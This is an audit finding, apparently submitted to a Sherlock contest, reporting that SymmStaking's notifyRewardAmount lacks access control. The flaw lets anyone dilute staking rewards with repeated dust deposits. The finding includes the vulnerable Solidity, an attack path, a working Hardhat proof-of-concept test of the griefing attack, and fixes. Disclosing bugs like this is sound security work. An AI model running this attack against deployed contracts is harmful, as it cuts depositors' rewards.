# SYMM depositors lose rewards because of the continuously lowered reward rate by repetitive attacks.

### Summary

The missing access control check in `SymmStaking::notifyRewardAmount` allows anyone to lower reward token rate by repetitively passing dust value to SymmStaking contract through [notifyRewardAmount](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/d7cf7fc96af1c25b53a7b500a98b411cd018c0d3/token/contracts/staking/SymmStaking.sol#L275C11-L275C29) call. The per reward token rate decreases everytime someone transfers a dust value through `SymmStaking::notifyRewardAmount`.

### Root Cause

The [SymmStaking::notifyRewardAmount](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/d7cf7fc96af1c25b53a7b500a98b411cd018c0d3/token/contracts/staking/SymmStaking.sol#L275C1-L292C3) function is as follows:
```solidity
/**
	 * @notice Notifies the contract about new reward amounts.
	 * @param tokens Array of reward token addresses.
	 * @param amounts Array of reward amounts corresponding to each token.
	 */
	function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts) external nonReentrant whenNotPaused {
		_updateRewardsStates(address(0));
		if (tokens.length != amounts.length) revert ArraysMismatched();

		uint256 len = tokens.length;
		for (uint256 i = 0; i < len; i++) {
			address token = tokens[i];
			uint256 amount = amounts[i];

			if (amount == 0) continue;
			if (!isRewardToken[token]) revert TokenNotWhitelisted(token);

			IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
			pendingRewards[token] += amount;
			_addRewardsForToken(token, amount);
		}
		emit RewardNotified(tokens, amounts);
	}
```
As we can see there is no access control check in the above function. There is also no dust value check. Anyone at anytime can invoke this function and pass dust value in the staking contract. 

The [SymmStaking::_addRewardsForToken](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/d7cf7fc96af1c25b53a7b500a98b411cd018c0d3/token/contracts/staking/SymmStaking.sol#L366) function is as follows:
```solidity
	function _addRewardsForToken(address token, uint256 amount) internal {
		TokenRewardState storage state = rewardState[token];

		if (block.timestamp >= state.periodFinish) {
			state.rate = amount / state.duration;
		} else {
			uint256 remaining = state.periodFinish - block.timestamp;
			uint256 leftover = remaining * state.rate;
			state.rate = (amount + leftover) / state.duration;
		}

		state.lastUpdated = block.timestamp;
		state.periodFinish = block.timestamp + state.duration;
	}
```
Once `SymmStaking::notifyRewardAmount` is invoked the above function recalculates and reset per token reward rate. 

So an attacker can lower the reward rate by passing dust value through `SymmStaking::notifyRewardAmount`. Depositors will lose reward If the attack is replayed indefinitely.

### Internal Pre-conditions

N/A

### External Pre-conditions

N/A

### Attack Path

1) Admin starts 7 days staking program by passing 700 USDC through `SymmStaking::notifyRewardAmount` call. Per day reward is 100 USDC. 
2) A depositor deposits 100 SYMM token. If he is the only depositor, he is expected to earn 700 USDC as reward after 7 days. 
3) Every 24 hours an attacker transfers `0.000001` USDC to the contract by calling `SymmStaking::notifyRewardAmount`. He replays the attack 6 times within a week. 
4) After 6 attacks the per day reward rate comes down from 100 to 39.3984 USDC. 
5) After 7 days the depositor collects reward by calling `claimRewards` function. His expected reward was 700 USDC but he got 461 USDC. 

### Impact

Depositors will lose a significant amount of reward token due to the lowered reward rate caused by the attack.

### PoC

1) Copy and paste the below test code in `symmStaking.behavior.ts`. 
2) run it with `npx hardhat test --grep test_grief_depositors` command. 

Expected output logs:
```{solidity}
Reward RATE(At the beginning): 99.9648 USDC per day.
Attack after 1 day)>>> USDC Supplied: 0.000001, RATE Lowered To: 85.6224 USDC per day.
Attack after 2 day)>>> USDC Supplied: 0.000001, RATE Lowered To: 73.3536 USDC per day.
Attack after 3 day)>>> USDC Supplied: 0.000001, RATE Lowered To: 62.8128 USDC per day.

Attack after 5 day)>>> USDC Supplied: 0.000001, RATE Lowered To: 46.0512 USDC per day.
Attack after 6 day)>>> USDC Supplied: 0.000001, RATE Lowered To: 39.3984 USDC per day.

Test Code:
```{solidity}

		it("test_grief_depositors", async function () {
			const dustAmount = 1;
			const oneDay = 86400;
			const amount = 100;
			const stakingAmount = e(amount);
			const usdcReward = 700e6;
			const attacker = context.signers.user3;
			await usdcToken.connect(admin).transfer(attacker.address, 100);	// attacker having some USDC balance.

			// Admin configuring the reward token and reward amount.
			await symmStaking.connect(admin).configureRewardToken(usdcToken.getAddress(), true)
			await usdcToken.connect(admin).approve(symmStaking.getAddress(), usdcReward);
			await symmStaking.connect(admin).notifyRewardAmount([usdcToken.getAddress()], [usdcReward])

			// user depositing staking token into symmStaking contract.
			await stakingToken.connect(user1).approve(symmStaking.getAddress(), stakingAmount)
			await symmStaking.connect(user1).deposit(stakingAmount, user1.address)
			
			let state = await symmStaking.rewardState(usdcToken.getAddress());
			console.log(`\nReward RATE(At the beginning): ${_ratePerDay(state)} USDC per day.`);

			// attack performed 6 times within a week by transferring only 0.000006 USDC.
			await time.increase(oneDay);	// elapsed 1 day
			await _attack(dustAmount, 1);
			await time.increase(oneDay);	// elapsed 2 day
			await _attack(dustAmount, 2);
			await time.increase(oneDay);	// elapsed 3 day
			await _attack(dustAmount, 3);
			await time.increase(oneDay);	// elapsed 4 day
			await _attack(dustAmount, 4);
			await time.increase(oneDay);	// elapsed 5 day
			await _attack(dustAmount, 5);
			await time.increase(oneDay);	// elapsed 6 day
			await _attack(dustAmount, 6);
			await time.increase(oneDay);	// elapsed 1 week

			const user1BalanceBefore = await usdcToken.balanceOf(user1.address)
			await symmStaking.connect(user1).claimRewards()
			const user1BalanceAfter = await usdcToken.balanceOf(user1.address)
			const claimed = Number(user1BalanceAfter - user1BalanceBefore);
			const loss = usdcReward - claimed;

			console.log(`Deposit token: ${amount} SYMM, Expected reward: ${usdcReward / 1e6} USDC, Claimed reward: ${claimed / 1e6}, Reward loss: ${loss / 1e6}`);

			async function _attack(_amount: any, _dayCount: any) {
				await usdcToken.connect(attacker).approve(symmStaking.getAddress(), _amount);
				await symmStaking.connect(attacker).notifyRewardAmount([usdcToken.getAddress()], [_amount]);
				state = await symmStaking.rewardState(usdcToken.getAddress());
				console.log(`Attack after ${_dayCount} day)>>> USDC Supplied: ${_amount / 1e6}, RATE Lowered To: ${_ratePerDay(state)} USDC per day.`);
			}
			function _ratePerDay(state: any) {
				return Number(state.rate) * oneDay / 1e6;
			}
		})
```

### Mitigation

1) Add a proper access control check in `SymmStaking::notifyRewardAmount` so that only authorized account can start staking program and provide reward tokens for distribution.
2) Add a minimum reward amount check so that the reward rate can't be lowered if a staking program is in progress.
